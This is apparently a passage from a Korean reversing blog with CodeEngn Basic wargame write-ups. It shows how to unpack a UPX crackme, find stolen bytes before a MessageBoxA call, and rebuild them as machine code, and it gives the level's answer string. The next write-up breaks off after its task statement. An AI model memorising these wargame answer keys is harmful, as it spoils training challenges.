url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB30lEQVR42o2QXWvTUBzG88H0wgs/gDeTKVRUmDeiE5UyENnVvsZu7HYxwbUuG07N1tA0a09y0pS8bAs4+ra206Q5J8k5SWkSSTMmOIX9eDg8B54//xfmQfHV87XVey+XFovLhZXXC29ePFstPn2/8vjd2ztPFm8VFm4/un9dD4vLd5cKzPr2x829SondLrHlElve2C1vsJUPO5ff/2lzt7L+aYtBHk7TNEmS9MbkYeRhZoLcKIqwj8MoJIRQSqfTqU8CQklAg4CQ3IdRGASBi9EsjmezWZqmE+QyrjsxTtQv/L5hGkK9Lsvw1DoRGjXugNN0VZZbR1AS6rysgK/73B7Hjn/Zef+scz52HMfJFfElaZLEyfydQynNYnGc/FV8k52vMn92Hl2MKaW+7wf/Ir8CISTKCHNPKY2iaDgeM91+HyHkOM7kGgihbrdrGIZlWcocXddz3+l0BqMh0xn0Xde1bduxnQzbyY1t28hF1qn14+wMY8xXDz5XdnTTxBgritJW2+OfF8z5aEgI8XzPDwJvPn0uz/dpSHu9HgAAKgqEEDSbQJJarZYoiueDQVZ8pEAJyOBQaH7jodCQqnXwnQdcDVTFxqEAmkA7NjXTlBTYkCRV09q6XhMFAKHcVn8DnU1lqf7mxvMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/93f578301acf0aed2ce921e4ce22cfec/c9b55/0.webp 165w,\n/static/93f578301acf0aed2ce921e4ce22cfec/a0b58/0.webp 230w\"\n              sizes=\"(max-width: 230px) 100vw, 230px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/93f578301acf0aed2ce921e4ce22cfec/04c57/0.png 165w,\n/static/93f578301acf0aed2ce921e4ce22cfec/81c8e/0.png 230w\"\n            sizes=\"(max-width: 230px) 100vw, 230px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/93f578301acf0aed2ce921e4ce22cfec/81c8e/0.png\"\n            alt=\"crackme\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 224px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 63.63636363636363%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABqElEQVR42p2RXW/TMBSG/bcQcI/EbkAwNDEQ0nYxGKKgAeOOXwWa+JoYY6xLIyeOmy5NlyZuBIWR5suxnaV2UDZxMypUePRcHFnn6D3WAbdfPFl63rrWWrv6YGVhfXVOl549uv74Prj1tLX6cnNhfeXC8o3LdxcvzeHFOzcXNx5eWbsHXn/afvtl993+5w/tvfl93957tbMNGOd1Xav6H1Cqac8oBXlBGWe0KBhjRcEKVgghTqqqLE+E4PQUxnmW50LwNMs4F5WUdV3HeQZoNrHtnn4AMbIQtAzddN1BmqRdZJkQDv0Aajru2Z32AbZtqGmWeXiW3ySfrS2nUkmppFJSNbVSUko5bRKax1Ok/F2dG/7PP0+SuCxLxmcjhChnMa2q4+gn+DYep0kazyJJkjAMCSGj0cj3/YCQESFhGHqeRwj5Oh7/bTiO4yAIoiiilO7ufNzaeuM4/TzPCSEIoe/HP0A0mQjOi+ZK5xWc+8Nh33G8oyOMkLbfxhgPPc9CyHWcOEkA7OLewLXd/p/2Bq5pdzUDdkxDRybElo7MjmloBuw6hzpGvwDf6oZ5vOailwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/34ad9c339022be4a75044902ec737b4a/c9b55/1.webp 165w,\n/static/34ad9c339022be4a75044902ec737b4a/81b02/1.webp 224w\"\n              sizes=\"(max-width: 224px) 100vw, 224px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/34ad9c339022be4a75044902ec737b4a/04c57/1.png 165w,\n/static/34ad9c339022be4a75044902ec737b4a/80b2d/1.png 224w\"\n            sizes=\"(max-width: 224px) 100vw, 224px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/34ad9c339022be4a75044902ec737b4a/80b2d/1.png\"\n            alt=\"crackme_Error\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>키파일을 체크하는 프로그램으로 보인다. 우선, PEiD로 이 프로그램에 대해 파악하도록 한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 418px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.36363636363636%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACBUlEQVR42lWRWW/TQBRG/R9ZghBC4o0CRVAICFWqBOoj/4YXhMQS3NaBJrEzHieesWexZ7zFnsx46TskVSU4Orr6nq6+q2s9ev/x4PTk8Yfjg9OT+29fjMaHo/Hze2/+czQ+vHP0dDQ+vH305O7rZ7deHjw8fvXg3ZFl/5p60J+cn9nOxQ/b/jqZnP+e2lPnu/3zbOrYzsW3yWQ6u/TD9QqjnSgM42g6u/z05bMlpGy1KfJCCpllmRRCCpnwNE2Sa0WaVmU59P3V1dXQD33bDcNQ5Lm7XFqEMUZZnudCCIRQKoQxpuu6/gaZ5YxRITNGWZIKbXSjVN3Ua4ysYLX2Fh5CESVkMXcxjowx+h8Y42AJMI4IISFCUoq6rquy9HxgRTEhccw5p5RCH/IkUUpprc0NUkiMUMITSgkAIAiCvCiqsvKgb6EowghzxpMkyfOi7wdjTPsPjPFVsGKMcc7DMKSUmbatNxt/FVhlVRpjlFLXbZtGKaXqutlbK6W2263Wequ2pjX9MHRdp7Vu25Ym3IJB4PsQQkgpDdfr3W1xjDFGCHmut5verurSdXmSKqWa/VKjDeHcwhjPZnMAfM45xni+Y0EZzzLpOA4AvhCiKIrFfBHAQAix2WwghCSmcL22APRd1/UBgHBVN01VVVVZNnuqsqyqjVJbpVS1Zx/KJVgSQv7++Q81uCbOs2ohtgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/c48872eb7958856d673884610996543d/c9b55/2.webp 165w,\n/static/c48872eb7958856d673884610996543d/f2908/2.webp 330w,\n/static/c48872eb7958856d673884610996543d/cd572/2.webp 418w\"\n              sizes=\"(max-width: 418px) 100vw, 418px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/c48872eb7958856d673884610996543d/04c57/2.png 165w,\n/static/c48872eb7958856d673884610996543d/d9ecf/2.png 330w,\n/static/c48872eb7958856d673884610996543d/d7398/2.png 418w\"\n            sizes=\"(max-width: 418px) 100vw, 418px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/c48872eb7958856d673884610996543d/d7398/2.png\"\n            alt=\"PEiD\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>UPX1으로 패킹되어 있음을 알 수 있다. upx 툴로 언패킹을 시켜준다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.454545454545457%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAuUlEQVR42lWL0WrFIBBEZ11vvNrVRNdcYyql5KH//4klFkp7OCwzA4ucS4qrFlXVWvaipX7W4+uQ7vNAGWQz+x5eH23XXVVDCPiFheEAO4vHnROQp3HeCmxz9wADC/A2XQDrHvZhtd7EJAAkSns1ACnFs3cAecs5Z2IybECAmd7BmG3L5/nun88Y09m7iIwxgvetteu63OJK0TGGc46I8Jd2HFXruq4iQkTWWiJiZjP5qcYYZv7/d/MNOfMKk0LxbS4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/583eb2aaebfb8af57c26ef57d3443a94/c9b55/3.webp 165w,\n/static/583eb2aaebfb8af57c26ef57d3443a94/f2908/3.webp 330w,\n/static/583eb2aaebfb8af57c26ef57d3443a94/ff4b8/3.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/583eb2aaebfb8af57c26ef57d3443a94/04c57/3.png 165w,\n/static/583eb2aaebfb8af57c26ef57d3443a94/d9ecf/3.png 330w,\n/static/583eb2aaebfb8af57c26ef57d3443a94/32056/3.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/583eb2aaebfb8af57c26ef57d3443a94/32056/3.png\"\n            alt=\"upx\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>언패킹을 하였더니 이전의 Click OK to check~~ 창 대신 오류 창이 뜬다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 239px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 63.63636363636363%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB+klEQVR42p2Pb2/SUBTG+8U0fANfmYm+2aiSGOPcBmw4IC7RxYj6KdS3xg27JcYZE6OMMBR6W1Ro6eg1cktbWui/S2l7DQzNsmTJ4i9PTp5z7rn3nEutpNeTuY07hfuJ9TU6tUKn7tH5NF3I0Ln0VPn0PM3/9ZspOpdJPsgmCxvU1eXbia3sra3s5cVrsZs3YvT1WCIeW4pP4z8txU8XLy0uLGTuXllOUpvPnqSfP14rbq8WH11cqafbq8WHlG0MCSFRFJELc9LseB410gxCSBiEZwiC4Iw5fUQIsR2HMlC/r/ZHI6sjCrbjjYZDsSMqCpI60vR523Jc79zJlmaEJAqCwHVd3/fDMHRdB+MxxjiabhSEYXTuZVs3/+/PrudR6NfvSRB4njee488inie+j2dMSxh7eM5kMjFMk+J43nVdhJAkSRBCaYYsyydelmXTNAeDgar2VVXVdd0wDE3X+4rSUxDVAKxtWRBChNAY4+9Nfo/Zb7faGGMFIdBoWJZlGnq9/rXEMLs7bzrH0BqOOoKIFEQJokgI0XWd5/lWqwUAe1SrAY5rtduA434KbVXTer2eLMuCILAcEI+7XQi7EGqmQb149fL9h4MS87ZcLvMcBwDbBICrN9hvdbZyJFTqH98dvN7dKTHM3v4+96Xa/FwFnw5/VGrsYfUPRPl6HYEgRBYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/bc87e030b7d695cf3ad6663226ff75a8/c9b55/4.webp 165w,\n/static/bc87e030b7d695cf3ad6663226ff75a8/0fcac/4.webp 239w\"\n              sizes=\"(max-width: 239px) 100vw, 239px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/bc87e030b7d695cf3ad6663226ff75a8/04c57/4.png 165w,\n/static/bc87e030b7d695cf3ad6663226ff75a8/4a279/4.png 239w\"\n            sizes=\"(max-width: 239px) 100vw, 239px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/bc87e030b7d695cf3ad6663226ff75a8/4a279/4.png\"\n            alt=\"Error\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABRElEQVR42n1Q226CQBCdBVZZLasI7gJyE7mIgheMrZqYuG3f7D/41F+ov99AbWp86DxMJmfOnHMycL1+XS6f+azw3BFCEMeF74eKIhNC1N9qt1uapg+HTquFVfUPh8N+nyRz1wsYGwKA56ecWQCAEIK7wrijaUYz3uGvb69FUXleyDmrj72UcbumSKimoRsZ4w6l5qOoEKey2Hh+yBvnwI0tk/3jjNDd5iRO83llO26SpSZ9oqu9dqiAAOgSaAA6AP05JhM7GBGV054kyzcBIU55vuKWs33e5uMQly89sW5jAFUCFaALdQdQMCmni9UkSsfRYrk0jMHNOZ8uLXtUVWs+0JEd9Uu/3wUZP8aeFZsgjpIsy9KU0ibP8XicZgtuOeuq+ngXujjL54OzA7KToNfENgAwKArJ/XjGzJAx13VNs/78NxvNI8gXBehrAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/d6351793639c9f57210ef16f3dd20cde/c9b55/5.webp 165w,\n/static/d6351793639c9f57210ef16f3dd20cde/f2908/5.webp 330w,\n/static/d6351793639c9f57210ef16f3dd20cde/ff4b8/5.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/d6351793639c9f57210ef16f3dd20cde/04c57/5.png 165w,\n/static/d6351793639c9f57210ef16f3dd20cde/d9ecf/5.png 330w,\n/static/d6351793639c9f57210ef16f3dd20cde/32056/5.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/d6351793639c9f57210ef16f3dd20cde/32056/5.png\"\n            alt=\"dbg\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>올리디버거로 열어보면 프로그램 시작 부분이 이상한 것을 볼 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.78787878787879%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAyUlEQVR42j3O3U6DMACG4a9NaRGXOQqlSAtdoaJd9xMjTj3xJjj1/q/DLDE+eS/gRUrzYC09fvDTPY7AI24ICCEAOuOnJ992KsbgfW+sLu4E/k3hW5av5GfNlohRI7YwHZQjuQNstbuOD5ehOGw3ibGQZYFSDwx/hflTN2f6deUng1iilxAVaEOoBqRSb3u7NPXBuXdZvqg6CdEz1nFuc9Fjfp72rifrypYaCXAEJaBB8tt2q0xUctwW1W7DMso545wJkeU5Lwr+CyGTEh/o89cCAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/beb8724d062e4aa5c70e9568cfe9eb16/c9b55/6.webp 165w,\n/static/beb8724d062e4aa5c70e9568cfe9eb16/f2908/6.webp 330w,\n/static/beb8724d062e4aa5c70e9568cfe9eb16/ff4b8/6.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/beb8724d062e4aa5c70e9568cfe9eb16/04c57/6.png 165w,\n/static/beb8724d062e4aa5c70e9568cfe9eb16/d9ecf/6.png 330w,\n/static/beb8724d062e4aa5c70e9568cfe9eb16/32056/6.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/beb8724d062e4aa5c70e9568cfe9eb16/32056/6.png\"\n            alt=\"MessageBoxA\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>아랫부분 코드를 참고하면, MessageBoxA의 인자를 4개씩 받는데에 비해, 처음 부분의 MessageBoxA는 hOwner 하나만 받고 있었다는 것을 알 수 있다. 여기가 stolenbyte인 것을 추측할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 230px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 62.42424242424243%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB30lEQVR42o2QXWvTUBzG88H0wgs/gDeTKVRUmDeiE5UyENnVvsZu7HYxwbUuG07N1tA0a09y0pS8bAs4+ra206Q5J8k5SWkSSTMmOIX9eDg8B54//xfmQfHV87XVey+XFovLhZXXC29ePFstPn2/8vjd2ztPFm8VFm4/un9dD4vLd5cKzPr2x829SondLrHlElve2C1vsJUPO5ff/2lzt7L+aYtBHk7TNEmS9MbkYeRhZoLcKIqwj8MoJIRQSqfTqU8CQklAg4CQ3IdRGASBi9EsjmezWZqmE+QyrjsxTtQv/L5hGkK9Lsvw1DoRGjXugNN0VZZbR1AS6rysgK/73B7Hjn/Zef+scz52HMfJFfElaZLEyfydQynNYnGc/FV8k52vMn92Hl2MKaW+7wf/Ir8CISTKCHNPKY2iaDgeM91+HyHkOM7kGgihbrdrGIZlWcocXddz3+l0BqMh0xn0Xde1bduxnQzbyY1t28hF1qn14+wMY8xXDz5XdnTTxBgritJW2+OfF8z5aEgI8XzPDwJvPn0uz/dpSHu9HgAAKgqEEDSbQJJarZYoiueDQVZ8pEAJyOBQaH7jodCQqnXwnQdcDVTFxqEAmkA7NjXTlBTYkCRV09q6XhMFAKHcVn8DnU1lqf7mxvMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/93f578301acf0aed2ce921e4ce22cfec/c9b55/7.webp 165w,\n/static/93f578301acf0aed2ce921e4ce22cfec/a0b58/7.webp 230w\"\n              sizes=\"(max-width: 230px) 100vw, 230px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/93f578301acf0aed2ce921e4ce22cfec/04c57/7.png 165w,\n/static/93f578301acf0aed2ce921e4ce22cfec/81c8e/7.png 230w\"\n            sizes=\"(max-width: 230px) 100vw, 230px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/93f578301acf0aed2ce921e4ce22cfec/81c8e/7.png\"\n            alt=\"crackme1\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>처음에 이 창이 뜨도록 아래의 MessageBoxA부분 코드를 흉내내서 코드를 채워주도록 한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 523px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 12.727272727272728%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAmklEQVR42iXJSQ6CMBhAYc5ApXT6B8tgYtDLIWJIDKQLWuDSRn2bb/GyZQ7j+BqG5zwvx76v6xq/pS1tKcWY0t8Y03Ec0/Tu+0cIIf5OhnAFQOesUpqZlVKykIgIDow2ZamI2FmrtTFGW9vIosxFLoQoTiLz1Z35TAAA2HUdM0kpq7pmJkICwPbStk2ttXbgvL/JQhGhMbby1Qd1BixWu3EFowAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/ddb0c936203638892ec966275886c658/c9b55/8.webp 165w,\n/static/ddb0c936203638892ec966275886c658/f2908/8.webp 330w,\n/static/ddb0c936203638892ec966275886c658/210f1/8.webp 523w\"\n              sizes=\"(max-width: 523px) 100vw, 523px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/ddb0c936203638892ec966275886c658/04c57/8.png 165w,\n/static/ddb0c936203638892ec966275886c658/d9ecf/8.png 330w,\n/static/ddb0c936203638892ec966275886c658/3e286/8.png 523w\"\n            sizes=\"(max-width: 523px) 100vw, 523px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/ddb0c936203638892ec966275886c658/3e286/8.png\"\n            alt=\"hexdump\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>희망하는 어셈블리어는 다음과 같다.</p>\n<div class=\"gatsby-highlight\" data-language=\"assembly\"><pre class=\"language-assembly\"><code class=\"language-assembly\">\r\nPUSH 0\r\nPUSH 09.004020000\r\nPUSH 09.004020012\r\n</code></pre></div>\n<p>이제 이것을 기계어로 쓰도록 한다. Big endian임에 주의한다.</p>\n<div class=\"gatsby-highlight\" data-language=\"assembly\"><pre class=\"language-assembly\"><code class=\"language-assembly\">\r\n6A 00\r\n68 00204000\r\n68 12204000\r\n</code></pre></div>\n<p>정답: 6A0068002040006812204000</p>","categories":["writeup","wargame","reversing"],"date":"July 21, 2015","description":"","id":"5b5f0f8d-ceed-522f-a6b4-c51c7d827894","keywords":["codeengn-basic"],"slug":"/CodeEngn-Basic-WriteUp-09/","title":"CodeEngn Basic 09","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#e8e8e8","images":{"fallback":{"src":"/static/2f0dbf4995fb898a4ca4be69c846f589/2e251/0.png","srcSet":"/static/2f0dbf4995fb898a4ca4be69c846f589/02b13/0.png 81w,\n/static/2f0dbf4995fb898a4ca4be69c846f589/72a41/0.png 162w,\n/static/2f0dbf4995fb898a4ca4be69c846f589/2e251/0.png 324w","sizes":"(min-width: 324px) 324px, 100vw"},"sources":[{"srcSet":"/static/2f0dbf4995fb898a4ca4be69c846f589/e32e4/0.webp 81w,\n/static/2f0dbf4995fb898a4ca4be69c846f589/864e1/0.webp 162w,\n/static/2f0dbf4995fb898a4ca4be69c846f589/d2fc7/0.webp 324w","type":"image/webp","sizes":"(min-width: 324px) 324px, 100vw"}]},"width":660,"height":399.25925925925924}}}},"body":"<p>OEP를 구한 후 \"등록성공\"으로 가는 분기점의 OPCODE를 구하시오. 정답인증은 OEP + OPCODE\r\nEX) 00400000EB03</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 324px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 58.18181818181818%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACMklEQVR42nWQ3U/TUBjG+5cxY/ReCZGJCWHGKBoj4AcX/gsiN36AYrKpbE64g2Q3hMANCYV977TMdZisa9e1Paen7zltl3VhMR2YYNQnv5w850lO3uc9wrXZianFp7eePZ56MTe+8Gh8fnZq8cn0y+cTCw/HZiZjiXgsEb9+f/rK3dtjM5M352ev3rsTS8RvzD2IJeLCcmp1dSOz8j29ml1/l/mykl3/kE2vZNNv0qml5No5r1PR+Sr58f23r8upT0vJtbfpz0vJNUFTtWKhUKtWJYR+1OvVcqWQz582mx7nzAUO7DLgugyi0KWuzz3BtCxZllutlqIoarut6brabusd3TTN7l9chJZlWpZt2wLGuFypNBoNXdd7vd5gMAhH6v9fYRhSSgkhAnWormldwzA6Hcs0/8Cy/pGMhDF2HEdwAIqyfNJs2oyFw2H/7Kw/HEYMBv0wjK6X+d3oYjKT5Z4o+vU6L5dZPs9FkeXzrFQCRXEdhxWLoCgMIXZ8zA8OoNNxWfRtZCTBlSTI5WihwLa2+OYm7OywXI7t7gJCtNuF/X04OuLb2zyTYXt7VNMogEspxjh6TABwEBDOse8Tzkmvh4MAB4HpODYhmDHCGPE87Pu275NRW4yxaZrRzoHnAaUeY6ZhiIeHSr3OAZjrdjSNAXijkhyA2PaxKBKMPc5ty+oaRuD7QktVa5KEJKkmoVKlXK5WIo+QfHKiau3mz9MaQudJoVRCUuSrtVpDUVqq+gsKKVghrItjKAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/2f0dbf4995fb898a4ca4be69c846f589/c9b55/0.webp 165w,\n/static/2f0dbf4995fb898a4ca4be69c846f589/4e123/0.webp 324w\"\n              sizes=\"(max-width: 324px) 100vw, 324px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/2f0dbf4995fb898a4ca4be69c846f589/04c57/0.png 165w,\n/static/2f0dbf4995fb898a4ca4be69c846f589/67580/0.png 324w\"\n            sizes=\"(max-width: 324px) 100vw, 324px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/2f0dbf4995fb898a4ca4be69c846f589/67580/0.png\"\n            alt=\"crackme\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>시리얼 키를 인증하는 프로그램으로 보인다. PEiD로 이 프로그램에 대한 정보를 얻는다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 418px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.96969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB/UlEQVR42jWPWW/TQBDH/TGLEsQLT4CiplCRIEAgDvWJr4SgbRKH+ojP2N7De2XX99W8o8TqT6PZv0Yzs//RXn7/9ebnl1c/Ps9uvj7/8HaymE8Wl9PlfLq8mi6vJourc2X+7Ho2WcwvrmeT95cX17MXH9+9/vZJe7AsJ/Bv16v7zeZ2df/79q9uPKx0/c/93UrXV7p+t15vTWMPkhiCMQBGlrO726y1PC+6tsuUYowrKQXnnHFKKCWEpCmj9CBEprLj43Gk7/thGKSUcRJrlDKEkBAHRqnv+4yxtuvGjmEY+r7nXEAIGeNpmgIAm7apqirPcoigFseJZVlxlCAIjX8GAKBt2+aJum4wTh1nFycQI7TfR5TSoiylPOyjSCOEJnGCcYog9FyPEFpVVdM07ROUsiiKME4hAJ7r+r6vskxKeRrGOI3jhJDTlUqqx+OxO9vuum4cRggHQQgAJISEYYhx2vdDplQCgFbX9emr+kRV10VRlGVZnBmdj/eP60Yx+hJCaGEYmKble34UxYEfeJ7nOO5ut3NdT6msLMv8vCjPx3x68iKv65oLrjFKbct2XZcxjhGybds0TEJIrpRpGEEQKCmLIvc8d7+PDkIURREGASEUIqTZjrPWN+ut/mBalDNMCCYp5YxyftaECUE5T0d9EBDjzXbreK5h2/8BP2EpfIYw3x4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/386f348f6c04763d4b8160c4ec8973a5/c9b55/1.webp 165w,\n/static/386f348f6c04763d4b8160c4ec8973a5/f2908/1.webp 330w,\n/static/386f348f6c04763d4b8160c4ec8973a5/cd572/1.webp 418w\"\n              sizes=\"(max-width: 418px) 100vw, 418px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/386f348f6c04763d4b8160c4ec8973a5/04c57/1.png 165w,\n/static/386f348f6c04763d4b8160c4ec8973a5/d9ecf/1.png 330w,\n/static/386f348f6c04763d4b8160c4ec8973a5/d7398/1.png 418w\"\n            sizes=\"(max-width: 418px) 100vw, 418px\"\n            type=\"image/png\"\n          />\n          